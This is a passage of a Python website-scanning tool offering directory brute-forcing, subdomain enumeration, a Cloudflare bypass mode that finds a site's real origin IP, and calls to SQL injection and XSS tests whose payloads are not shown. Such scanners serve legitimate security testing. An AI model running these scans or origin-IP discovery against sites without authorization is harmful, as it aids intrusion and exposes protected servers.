                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            
            if use_cloudflare_bypass:
                headers.update({
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0'
                })
            
            response = requests.get(test_url, timeout=5, allow_redirects=False, headers=headers)
            
            if response.status_code in [200, 301, 302, 403, 401, 500]:
                content_type = response.headers.get('content-type', 'unknown')
                server = response.headers.get('server', 'unknown')
                
                found_dirs.append({
                    'path': directory,
                    'status': response.status_code,
                    'size': len(response.content),
                    'url': test_url,
                    'content_type': content_type,
                    'server': server,
                    'headers': dict(response.headers)
                })
                
                status_color = Fore.GREEN if response.status_code == 200 else Fore.YELLOW
                print_colored(f"✅ Found: {directory} (Status: {response.status_code}, Size: {len(response.content)}, Type: {content_type})", status_color)
            
            checked += 1
            if checked % 100 == 0:
                print_colored(f"[PROGRESS] Checked {checked}/{len(directories)} directories...", Fore.CYAN)
                
        except Exception as e:
            pass
    
    print_colored(f"[INFO] Starting bruteforce with {len(directories)} directories...", Fore.CYAN)
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(check_directory, directories)
    
    print_colored(f"[COMPLETE] Checked {checked} directories, found {len(found_dirs)} accessible paths", Fore.GREEN)
    
    if found_dirs:
        filename = f"directories_{urlparse(url).netloc.replace('.', '_')}.json"
        try:
            with open(filename, 'w') as f:
                json.dump(found_dirs, f, indent=2)
            print_colored(f"[SAVED] Directory results saved to {filename}", Fore.GREEN)
        except Exception as e:
            print_colored(f"[ERROR] Failed to save results: {str(e)}", Fore.RED)
    
    return found_dirs

def check_ssl_certificate(url):
    try:
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        
        if parsed_url.scheme != 'https':
            return {'error': 'Not an HTTPS URL'}
        
        context = ssl.create_default_context()
        with socket.create_connection((hostname, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                
                return {
                    'subject': dict(x[0] for x in cert['subject']),
                    'issuer': dict(x[0] for x in cert['issuer']),
                    'version': cert['version'],
                    'serial_number': cert['serialNumber'],
                    'not_before': cert['notBefore'],
                    'not_after': cert['notAfter'],
                    'signature_algorithm': cert.get('signatureAlgorithm', 'Unknown')
                }
                
    except Exception as e:
        return {'error': str(e)}

def extract_links_and_forms(html_content, base_url):
    if not html_content:
        return [], []
    
    links = []
    forms = []
    
    link_pattern = r'<a[^>]+href=["\']([^"\']+)["\'][^>]*>'
    form_pattern = r'<form[^>]*>(.*?)</form>'
    input_pattern = r'<input[^>]*>'
    
    for match in re.finditer(link_pattern, html_content, re.IGNORECASE):
        link = match.group(1)
        full_link = urljoin(base_url, link)
        links.append(full_link)
    
    for match in re.finditer(form_pattern, html_content, re.IGNORECASE | re.DOTALL):
        form_html = match.group(0)
        action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        
        action = action_match.group(1) if action_match else ""
        method = method_match.group(1) if method_match else "GET"
        
        inputs = re.findall(input_pattern, form_html, re.IGNORECASE)
        
        forms.append({
            'action': urljoin(base_url, action),
            'method': method.upper(),
            'inputs': len(inputs),
            'html': form_html[:200] + '...' if len(form_html) > 200 else form_html
        })
    
    return list(set(links)), forms

def comprehensive_website_analysis(url, use_cloudflare_bypass=False, max_dirs=500):
    print_colored(f"\n{'='*80}", Fore.CYAN)
    print_colored(f"🌐 COMPREHENSIVE WEBSITE ANALYSIS: {url}", Fore.WHITE)
    print_colored(f"{'='*80}", Fore.CYAN)
    
    if use_cloudflare_bypass:
        print_colored("[INFO] Using Cloudflare bypass techniques", Fore.YELLOW)
    
    info, html_content = get_website_info(url, use_cloudflare_bypass)
    
    if 'error' in info:
        print_colored(f"❌ Error accessing website: {info['error']}", Fore.RED)
        return None
    
    print_colored("📊 BASIC INFORMATION:", Fore.CYAN)
    print_colored(f"Domain: {info['domain']}", Fore.WHITE)
    print_colored(f"Server IP: {info['server_ip']}", Fore.WHITE)
    print_colored(f"Status Code: {info['status_code']}", Fore.WHITE)
    print_colored(f"Final URL: {info['final_url']}", Fore.WHITE)
    print_colored(f"Content Type: {info['content_type']}", Fore.WHITE)
    print_colored(f"Content Length: {info['content_length']:,} bytes", Fore.WHITE)
    print_colored(f"Response Time: {info['response_time']:.2f} seconds", Fore.WHITE)
    print_colored(f"Encoding: {info['encoding']}", Fore.WHITE)
    print_colored(f"Server: {info['server']}", Fore.WHITE)
    print_colored(f"Powered By: {info['powered_by']}", Fore.WHITE)
    
    if info['is_behind_cloudflare']:
        print_colored(f"\n🛡️ CLOUDFLARE DETECTED:", Fore.YELLOW)
        print_colored(f"CF-Ray: {info.get('cloudflare_ray', 'Not found')}", Fore.YELLOW)
        print_colored(f"CF-Cache-Status: {info.get('cloudflare_cache', 'Not found')}", Fore.YELLOW)
        
        if 'real_ips' in info and info['real_ips']:
            print_colored(f"🎯 REAL IPs FOUND:", Fore.GREEN)
            for ip_info in info['real_ips']:
                print_colored(f"  • {ip_info['ip']} ({ip_info['subdomain']}) - Method: {ip_info['method']}", Fore.GREEN)
        else:
            print_colored("❌ No real IPs found behind Cloudflare", Fore.RED)
    else:
        print_colored(f"\n✅ NOT BEHIND CLOUDFLARE", Fore.GREEN)
    
    print_colored("\n🔧 TECHNOLOGY STACK:", Fore.CYAN)
    technologies = detect_technologies(html_content, info['headers'])
    if technologies:
        for tech in technologies:
            print_colored(f"  • {tech}", Fore.GREEN)
    else:
        print_colored("  No specific technologies detected", Fore.YELLOW)
    
    print_colored("\n🔒 SECURITY HEADERS:", Fore.CYAN)
    present_headers, missing_headers = check_security_headers(info['headers'])
    
    if present_headers:
        print_colored("✅ Present Security Headers:", Fore.GREEN)
        for header in present_headers:
            print_colored(f"  • {header}", Fore.GREEN)
    
    if missing_headers:
        print_colored("❌ Missing Security Headers:", Fore.RED)
        for header in missing_headers:
            print_colored(f"  • {header}", Fore.RED)
    
    print_colored("\n🔐 SSL CERTIFICATE:", Fore.CYAN)
    ssl_info = check_ssl_certificate(url)
    if 'error' not in ssl_info:
        print_colored(f"Subject: {ssl_info['subject'].get('commonName', 'Unknown')}", Fore.GREEN)
        print_colored(f"Issuer: {ssl_info['issuer'].get('organizationName', 'Unknown')}", Fore.GREEN)
        print_colored(f"Valid From: {ssl_info['not_before']}", Fore.GREEN)
        print_colored(f"Valid Until: {ssl_info['not_after']}", Fore.GREEN)
        print_colored(f"Signature Algorithm: {ssl_info['signature_algorithm']}", Fore.GREEN)
    else:
        print_colored(f"SSL Error: {ssl_info['error']}", Fore.RED)
    
    print_colored("\n📋 WHOIS INFORMATION:", Fore.CYAN)
    whois_info = info.get('whois', {})
    if 'error' not in whois_info:
        print_colored(f"Registrar: {whois_info.get('registrar', 'Unknown')}", Fore.WHITE)
        print_colored(f"Creation Date: {whois_info.get('creation_date', 'Unknown')}", Fore.WHITE)
        print_colored(f"Expiration Date: {whois_info.get('expiration_date', 'Unknown')}", Fore.WHITE)
        print_colored(f"Country: {whois_info.get('country', 'Unknown')}", Fore.WHITE)
        print_colored(f"Organization: {whois_info.get('org', 'Unknown')}", Fore.WHITE)
        if whois_info.get('name_servers'):
            print_colored(f"Name Servers: {', '.join(whois_info['name_servers'][:3])}", Fore.WHITE)
    else:
        print_colored(f"WHOIS Error: {whois_info['error']}", Fore.RED)
    
    print_colored("\n🌐 DNS RECORDS:", Fore.CYAN)
    dns_records = info.get('dns_records', {})
    for record_type, records in dns_records.items():
        if records:
            print_colored(f"{record_type}: {', '.join(records[:3])}", Fore.WHITE)
            if len(records) > 3:
                print_colored(f"  ... and {len(records) - 3} more {record_type} records", Fore.YELLOW)
    
    print_colored("\n🔍 DIRECTORY ENUMERATION:", Fore.CYAN)
    found_dirs = directory_bruteforce(url, max_dirs, use_cloudflare_bypass)
    if found_dirs:
        print_colored(f"Found {len(found_dirs)} accessible directories:", Fore.GREEN)
        for dir_info in found_dirs[:15]:
            status_color = Fore.GREEN if dir_info['status'] == 200 else Fore.YELLOW
            print_colored(f"  • {dir_info['path']} (Status: {dir_info['status']}, Size: {dir_info['size']} bytes, Type: {dir_info['content_type']})", status_color)
        if len(found_dirs) > 15:
            print_colored(f"  ... and {len(found_dirs) - 15} more directories", Fore.YELLOW)
    else:
        print_colored("No accessible directories found", Fore.YELLOW)
    
    print_colored("\n🔗 LINKS AND FORMS:", Fore.CYAN)
    links, forms = extract_links_and_forms(html_content, url)
    print_colored(f"Found {len(links)} links and {len(forms)} forms", Fore.WHITE)
    
    if forms:
        print_colored("Forms detected:", Fore.YELLOW)
        for i, form in enumerate(forms[:5], 1):
            print_colored(f"  {i}. Action: {form['action']}, Method: {form['method']}, Inputs: {form['inputs']}", Fore.WHITE)
    
    print_colored("\n⚠️ VULNERABILITY TESTING:", Fore.CYAN)
    sql_vulns = test_sql_injection(url)
    xss_vulns = test_xss_vulnerabilities(url)
    
    if sql_vulns:
        print_colored("🚨 SQL Injection Vulnerabilities:", Fore.RED)
        for vuln in sql_vulns:
            print_colored(f"  • {vuln}", Fore.RED)
    else:
        print_colored("✅ No SQL injection vulnerabilities detected", Fore.GREEN)
    
    if xss_vulns:
        print_colored("🚨 XSS Vulnerabilities:", Fore.RED)
        for vuln in xss_vulns:
            print_colored(f"  • {vuln}", Fore.RED)
    else:
        print_colored("✅ No XSS vulnerabilities detected", Fore.GREEN)
    
    return {
        'basic_info': info,
        'technologies': technologies,
        'security_headers': {'present': present_headers, 'missing': missing_headers},
        'ssl_certificate': ssl_info,
        'directories': found_dirs,
        'links_count': len(links),
        'forms_count': len(forms),
        'sql_vulnerabilities': sql_vulns,
        'xss_vulnerabilities': xss_vulns
    }

def bulk_website_analysis():
    print_colored("📋 BULK WEBSITE ANALYSIS", Fore.CYAN)
    
    urls_input = input(f"{Fore.WHITE}Enter URLs (comma separated): {Style.RESET_ALL}").strip()
    if not urls_input:
        print_colored("[ERROR] No URLs provided!", Fore.RED)
        return
    
    urls = [url.strip() for url in urls_input.split(',')]
    results = []
    
    for url in urls:
        print_colored(f"\n[INFO] Analyzing {url}...", Fore.YELLOW)
        result = comprehensive_website_analysis(url)
        if result:
            results.append(result)
    
    if results:
        filename = f"website_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2, default=str)
            print_colored(f"[SUCCESS] Bulk analysis saved to {filename}", Fore.GREEN)
        except Exception as e:
            print_colored(f"[ERROR] Failed to save: {str(e)}", Fore.RED)

def subdomain_enumeration(domain):
    print_colored(f"🔍 SUBDOMAIN ENUMERATION: {domain}", Fore.CYAN)
    
    common_subdomains = [
        'www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'beta',
        'api', 'app', 'blog', 'shop', 'store', 'support', 'help', 'docs',
        'cdn', 'static', 'assets', 'img', 'images', 'media', 'upload',
        'download', 'files', 'secure', 'ssl', 'vpn', 'remote', 'portal',
        'dashboard', 'panel', 'cpanel', 'webmail', 'email', 'smtp', 'pop',
        'imap', 'ns1', 'ns2', 'dns', 'mx', 'mx1', 'mx2', 'autodiscover'
    ]
    
    found_subdomains = []
    
    def check_subdomain(subdomain):
        try:
            full_domain = f"{subdomain}.{domain}"
            response = requests.get(f"http://{full_domain}", timeout=5, allow_redirects=False)
            found_subdomains.append({
                'subdomain': full_domain,
                'status': response.status_code,
                'ip': socket.gethostbyname(full_domain)
            })
            print_colored(f"✅ Found: {full_domain} (Status: {response.status_code})", Fore.GREEN)
        except:
            pass
    
    print_colored(f"[INFO] Checking {len(common_subdomains)} common subdomains...", Fore.YELLOW)
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(check_subdomain, common_subdomains)
    
    return found_subdomains

def run_website_analyzer():
    print_colored("=" * 70, Fore.CYAN)
    print_colored("            ADVANCED WEBSITE ANALYZER", Fore.WHITE)
    print_colored("=" * 70, Fore.CYAN)
    print_colored("Professional web security and analysis tool", Fore.YELLOW)
    print_colored("=" * 70, Fore.CYAN)
    
    while True:
        print_colored("\nSelect analysis mode:", Fore.WHITE)
        print_colored("1. Comprehensive Website Analysis", Fore.GREEN)
        print_colored("2. Bulk Website Analysis", Fore.YELLOW)
        print_colored("3. Subdomain Enumeration", Fore.YELLOW)
        print_colored("4. Quick Security Scan", Fore.YELLOW)
        print_colored("5. Technology Detection Only", Fore.YELLOW)
        print_colored("6. Cloudflare Bypass & Real IP Finder", Fore.YELLOW)
        print_colored("7. Advanced Directory Bruteforce", Fore.YELLOW)
        print_colored("8. Exit", Fore.RED)
        
        choice = input(f"\n{Fore.WHITE}Enter choice (1-8): {Style.RESET_ALL}").strip()
        
        if choice == '1':
            url = input(f"{Fore.WHITE}Enter website URL: {Style.RESET_ALL}").strip()
            if url:
                # Ask for advanced options
                print_colored("\nAdvanced Options:", Fore.CYAN)
                cloudflare_bypass = input(f"{Fore.WHITE}Use Cloudflare bypass techniques? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
                
                try:
                    max_dirs = int(input(f"{Fore.WHITE}Max directories to check (default: 500): {Style.RESET_ALL}") or "500")
                except:
                    max_dirs = 500
                
                result = comprehensive_website_analysis(url, cloudflare_bypass, max_dirs)
                
                if result:
                    save = input(f"\n{Fore.WHITE}Save results to file? (y/n): {Style.RESET_ALL}").strip().lower()
                    if save == 'y':
                        filename = f"analysis_{urlparse(url).netloc.replace('.', '_')}.json"
                        try:
                            with open(filename, 'w') as f:
                                json.dump(result, f, indent=2, default=str)
                            print_colored(f"[SUCCESS] Results saved to {filename}", Fore.GREEN)
                        except Exception as e:
                            print_colored(f"[ERROR] Failed to save: {str(e)}", Fore.RED)
        
        elif choice == '2':
            bulk_website_analysis()
        
        elif choice == '3':
            domain = input(f"{Fore.WHITE}Enter domain (e.g., example.com): {Style.RESET_ALL}").strip()
            if domain:
                subdomains = subdomain_enumeration(domain)
                print_colored(f"\n[RESULTS] Found {len(subdomains)} subdomains:", Fore.GREEN)
                for sub in subdomains:
                    print_colored(f"  • {sub['subdomain']} ({sub['ip']})", Fore.WHITE)
        
        elif choice == '4':
            url = input(f"{Fore.WHITE}Enter website URL: {Style.RESET_ALL}").strip()
            if url:
                print_colored("[INFO] Performing quick security scan...", Fore.YELLOW)
                info, html = get_website_info(url)
                if 'error' not in info:
                    present, missing = check_security_headers(info['headers'])
                    sql_vulns = test_sql_injection(url)
                    xss_vulns = test_xss_vulnerabilities(url)
                    
                    print_colored(f"\n🔒 Security Headers: {len(present)} present, {len(missing)} missing", Fore.CYAN)
                    print_colored(f"🚨 SQL Injection: {len(sql_vulns)} vulnerabilities found", Fore.RED if sql_vulns else Fore.GREEN)
                    print_colored(f"🚨 XSS: {len(xss_vulns)} vulnerabilities found", Fore.RED if xss_vulns else Fore.GREEN)
        
        elif choice == '5':
            url = input(f"{Fore.WHITE}Enter website URL: {Style.RESET_ALL}").strip()
            if url:
                info, html = get_website_info(url)
                if 'error' not in info:
                    technologies = detect_technologies(html, info['headers'])
                    print_colored(f"\n🔧 Detected Technologies:", Fore.CYAN)
                    for tech in technologies:
                        print_colored(f"  • {tech}", Fore.GREEN)
        
        elif choice == '6':
            url = input(f"{Fore.WHITE}Enter website URL: {Style.RESET_ALL}").strip()
            if url:
                domain = urlparse(url).netloc if url.startswith(('http://', 'https://')) else url
                
                print_colored(f"\n🛡️ CLOUDFLARE BYPASS & REAL IP FINDER", Fore.CYAN)
                print_colored(f"Target: {domain}", Fore.WHITE)
                
                # Check if behind Cloudflare
                try:
                    main_ip = socket.gethostbyname(domain)
                    behind_cf = is_cloudflare_ip(main_ip)
                    
                    print_colored(f"Main IP: {main_ip}", Fore.WHITE)
                    print_colored(f"Behind Cloudflare: {'Yes' if behind_cf else 'No'}", Fore.YELLOW if behind_cf else Fore.GREEN)
                    
                    if behind_cf:
                        real_ips = get_real_ip_behind_cloudflare(domain)
                        if real_ips:
                            print_colored(f"\n🎯 REAL IPs DISCOVERED:", Fore.GREEN)
                            for ip_info in real_ips:
                                print_colored(f"  • {ip_info['ip']} ({ip_info['subdomain']}) - Method: {ip_info['method']}", Fore.GREEN)
                        else:
                            print_colored("\n❌ No real IPs found", Fore.RED)
                    else:
                        print_colored("\n✅ Website is not behind Cloudflare", Fore.GREEN)
                        
                except Exception as e:
                    print_colored(f"❌ Error: {str(e)}", Fore.RED)
        
        elif choice == '7':
            url = input(f"{Fore.WHITE}Enter website URL: {Style.RESET_ALL}").strip()
            if url:
                try:
                    max_dirs = int(input(f"{Fore.WHITE}Max directories to check (default: 1000): {Style.RESET_ALL}") or "1000")
                except:
                    max_dirs = 1000
                
                cloudflare_bypass = input(f"{Fore.WHITE}Use Cloudflare bypass? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
                
                print_colored(f"\n🔍 ADVANCED DIRECTORY BRUTEFORCE", Fore.CYAN)
                found_dirs = directory_bruteforce(url, max_dirs, cloudflare_bypass)
                
                if found_dirs:
                    print_colored(f"\n📊 SUMMARY:", Fore.CYAN)
                    status_counts = {}
                    for dir_info in found_dirs:
                        status = dir_info['status']
                        status_counts[status] = status_counts.get(status, 0) + 1
                    
                    for status, count in status_counts.items():
                        print_colored(f"Status {status}: {count} directories", Fore.WHITE)
        
        elif choice == '8':
            print_colored("Exiting website analyzer...", Fore.YELLOW)
            break
        
        else:
            print_colored("[ERROR] Invalid choice!", Fore.RED)
        
        if choice != '8':
            continue_choice = input(f"\n{Fore.WHITE}Continue analyzing? (y/n): {Style.RESET_ALL}").strip().lower()
            if continue_choice != 'y':
                break

if __name__ == "__main__":
    run_website_analyzer() 